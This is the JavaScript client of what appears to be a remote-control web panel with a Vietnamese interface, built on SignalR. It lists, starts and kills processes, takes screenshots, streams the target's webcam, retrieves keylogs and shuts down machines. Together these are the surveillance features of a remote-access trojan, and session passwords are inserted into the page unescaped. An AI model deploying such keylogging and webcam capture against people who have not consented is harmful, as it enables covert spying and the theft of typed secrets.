let connection = null;
let targetIp = null;
let isWebcamStreaming = false;
let frameCount = 0;
let lastFpsUpdate = Date.now();
let serverInfo = { ip: null, port: null };

document.addEventListener('DOMContentLoaded', async () => {
    await loadServerInfo();
    await setupSignalR();
});

function selectMode(mode) {
    document.getElementById('modeSelection').style.display = mode ? 'none' : 'grid';
    document.getElementById('loginSection').classList.remove('active');
    document.getElementById('controlledSection').classList.remove('active');

    if (mode === 'controller') {
        document.getElementById('loginSection').classList.add('active');
    } else if (mode === 'controlled') {
        document.getElementById('controlledSection').classList.add('active');
        refreshSessions();
    }
}

function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById(tabName + 'Tab').classList.add('active');
}

async function setupSignalR() {
    if (!connection) {
        connection = new signalR.HubConnectionBuilder()
            .withUrl("/controlHub")
            .build();

        connection.on("ReceiveResponse", (response) => {
            console.log("📥", response.substring(0, 100));
            handleResponse(response);
        });
    }

    if (connection.state === "Connected" || connection.state === "Connecting") return;

    try {
        await connection.start();
        console.log("✅ SignalR connected!");
    } catch (err) {
        console.error("❌ SignalR failed:", err);
        alert("Không thể kết nối đến server");
    }
}

function handleResponse(response) {
    const parts = response.split('|');
    if (parts.length < 2) return;

    const responseType = parts[1];
    const data = parts.slice(2).join('|');

    switch (responseType) {
        case 'SUCCESS':
            if (!data.includes('Webcam') && !data.includes('streaming')) {
                alert('✅ ' + data);
            }
            document.getElementById('loginSection').classList.remove('active');
            document.getElementById('controlPanel').classList.add('active');
            break;
        case 'FAILED':
            alert('❌ ' + data);
            break;
        case 'ERROR':
            alert('⚠️ Lỗi: ' + data);
            break;
        case 'SCREENSHOT':
            document.getElementById('screenshotContainer').innerHTML =
                `<img src="data:image/jpeg;base64,${data}" class="screenshot-preview">`;
            break;
        case 'WEBCAM_IMAGE':
            addWebcamSnapshot(data);
            break;
        case 'WEBCAM_FRAME':
            if (isWebcamStreaming) updateWebcamFrame(data);
            break;
        case 'APPS':
            displayApps(data);
            break;
        case 'PROCESSES':
            displayProcesses(data);
            break;
        case 'KEYLOGS':
            document.getElementById('keylogDisplay').textContent = data || "Không có keylogs.";
            break;
        case 'SESSIONS':
            renderSessions(data);
            break;
    }
}

async function loadServerInfo() {
    try {
        const res = await fetch('/server-info.json');
        if (!res.ok) throw new Error(res.statusText);
        const json = await res.json();
        serverInfo = { ip: json.Ip, port: json.Port };
        document.getElementById('serverEndpoint').textContent = `${json.Ip}:${json.Port}`;
    } catch {
        document.getElementById('serverEndpoint').textContent = 'Không lấy được IP server, dùng thủ công.';
    }
}

function downloadClientPackage() {
    window.location.href = '/downloads/client-controlled.zip';
}

async function refreshSessions() {
    await setupSignalR();
    if (connection && connection.state === "Connected") {
        connection.invoke("RequestSessions").catch(err => console.error(err));
    }
}

function renderSessions(data) {
    const container = document.getElementById('sessionList');
    if (!data) {
        container.textContent = "Chưa có máy kết nối.";
        return;
    }

    const items = data.split('||').filter(Boolean);
    if (items.length === 0) {
        container.textContent = "Chưa có máy kết nối.";
        return;
    }

    container.innerHTML = '';
    items.forEach(item => {
        const [ip, password, status] = item.split(':');
        const card = document.createElement('div');
        card.className = 'session-item';
        card.innerHTML = `
            <div class="session-meta">
                <strong>${ip || 'N/A'}</strong>
                <span>Password: ${password || 'N/A'}</span>
            </div>
            <span class="session-status ${status === 'WAITING' ? 'waiting' : ''}">${status || 'UNKNOWN'}</span>
        `;
        container.appendChild(card);
    });
}

function updateWebcamFrame(base64Data) {
    let container = document.getElementById('webcamContainer');
    let img = document.getElementById('webcamStreamImg');

    if (!img) {
        container.innerHTML = `
                <img id="webcamStreamImg" class="webcam-stream">
                <div class="webcam-overlay">
                    <div class="webcam-status">
                        <div class="live-indicator">
                            <div class="live-dot"></div>
                            LIVE
                        </div>
                    </div>
                    <div class="webcam-fps" id="webcamFps">-- FPS</div>
                </div>
            `;
        img = document.getElementById('webcamStreamImg');
    }

    img.src = 'data:image/jpeg;base64,' + base64Data;

    frameCount++;
    const now = Date.now();
    if (now - lastFpsUpdate >= 1000) {
        const fps = Math.round(frameCount / ((now - lastFpsUpdate) / 1000));
        document.getElementById('webcamFps').textContent = `${fps} FPS`;
        frameCount = 0;
        lastFpsUpdate = now;
    }
}

function addWebcamSnapshot(base64Data) {
    const container = document.getElementById('webcamSnapshots');
    const time = new Date().toLocaleTimeString();
    const snapshot = document.createElement('div');
    snapshot.className = 'snapshot-item';
    snapshot.innerHTML = `
            <img src="data:image/jpeg;base64,${base64Data}">
            <div class="snapshot-time">${time}</div>
        `;
    container.insertBefore(snapshot, container.firstChild);
}

function displayApps(data) {
    let html = '';
    const apps = data.split('||');
    apps.forEach(appStr => {
        if (appStr) {
            const [name, id, title] = appStr.split(':');
            html += `
                    <div class="list-item">
                        <div class="list-item-info">
                            <h4>${name || 'N/A'}</h4>
                            <p>${title || '...'} (PID: ${id || 'N/A'})</p>
                        </div>
                        <button class="btn-stop" onclick="stopApp('${id}')">Stop</button>
                    </div>`;
        }
    });
    document.getElementById('appsList').innerHTML = html || "<p>Không có ứng dụng.</p>";
}

function displayProcesses(data) {
    let html = '';
    const processes = data.split('||');
    processes.forEach(procStr => {
        if (procStr) {
            const [name, id, memory] = procStr.split(':');
            html += `
                    <div class="list-item">
                        <div class="list-item-info">
                            <h4>${name || 'N/A'}</h4>
                            <p>PID: ${id || 'N/A'} | ${memory || 'N/A'}</p>
                        </div>
                        <button class="btn-stop" onclick="stopProcess('${id}')">Kill</button>
                    </div>`;
        }
    });
    document.getElementById('processesList').innerHTML = html || "<p>Không có process.</p>";
}

function sendCommand(commandType, parameters = '') {
    if (!connection || !targetIp) {
        alert("Chưa kết nối!");
        return;
    }
    connection.invoke("SendCommandToServer", commandType, targetIp, parameters)
        .catch(err => console.error(err));
}

async function login() {
    const ip = document.getElementById('loginIp').value;
    const password = document.getElementById('loginPassword').value;

    if (!ip || !password) {
        alert('Vui lòng nhập đầy đủ thông tin!');
        return;
    }

    await setupSignalR();

    if (connection && connection.state === "Connected") {
        targetIp = ip;
        document.getElementById('connectedIp').textContent = 'Đang điều khiển: ' + ip;
        sendCommand("LOGIN", password);
    }
   
}

function disconnect() {
    stopWebcamStream();
    if (connection) connection.stop();
    targetIp = null;
    document.getElementById('controlPanel').classList.remove('active');
    selectMode(null);
}

function listApplications() { sendCommand('LIST_APPS'); }
function startApp() {
    const path = prompt('Đường dẫn (VD: notepad.exe):');
    if (path) sendCommand('START_APP', path);
}
function stopApp(id) {
    if (confirm('Dừng app?')) sendCommand('STOP_APP', id);
}

function listProcesses() { sendCommand('LIST_PROCESSES'); }
function startProcess() {
    const name = prompt('Tên process:');
    if (name) sendCommand('START_PROCESS', name);
}
function stopProcess(id) {
    if (confirm('Kill process?')) sendCommand('STOP_PROCESS', id);
}

function takeScreenshot() {
    sendCommand('SCREENSHOT');
    document.getElementById('screenshotContainer').innerHTML = "<p>⏳ Đang chụp...</p>";
}

function getKeylogs() { sendCommand('GET_KEYLOGS'); }
function clearKeylogs() {
    if (confirm('Xóa keylogs?')) sendCommand('CLEAR_KEYLOGS');
}

function startWebcam() {
    sendCommand('WEBCAM_ON');
    document.getElementById('webcamContainer').innerHTML =
        '<div class="webcam-placeholder"><div class="icon">📹</div><h3>Đang khởi động...</h3></div>';
}

function startWebcamStream() {
    if (isWebcamStreaming) {
        alert('Stream đang chạy!');
        return;
    }
    sendCommand('WEBCAM_STREAM_START');
    isWebcamStreaming = true;
    frameCount = 0;
    lastFpsUpdate = Date.now();
}

function stopWebcamStream() {
    if (!isWebcamStreaming) return;
    sendCommand('WEBCAM_STREAM_STOP');
    isWebcamStreaming = false;
    document.getElementById('webcamContainer').innerHTML =
        '<div class="webcam-placeholder"><div class="icon">⏸️</div><h3>Stream đã dừng</h3></div>';
}

function captureWebcam() {
    sendCommand('WEBCAM_CAPTURE');
}

function stopWebcam() {
    if (confirm('Tắt webcam?')) {
        stopWebcamStream();
        sendCommand('WEBCAM_OFF');
        document.getElementById('webcamContainer').innerHTML =
            '<div class="webcam-placeholder"><div class="icon">📹</div><h3>Webcam đã tắt</h3></div>';
        document.getElementById('webcamSnapshots').innerHTML = '';
    }
}

function shutdownPC() {
    if (confirm('⚠️ TẮT MÁY?')) sendCommand('SHUTDOWN');
}
function restartPC() {
    if (confirm('⚠️ RESTART?')) sendCommand('RESTART');
}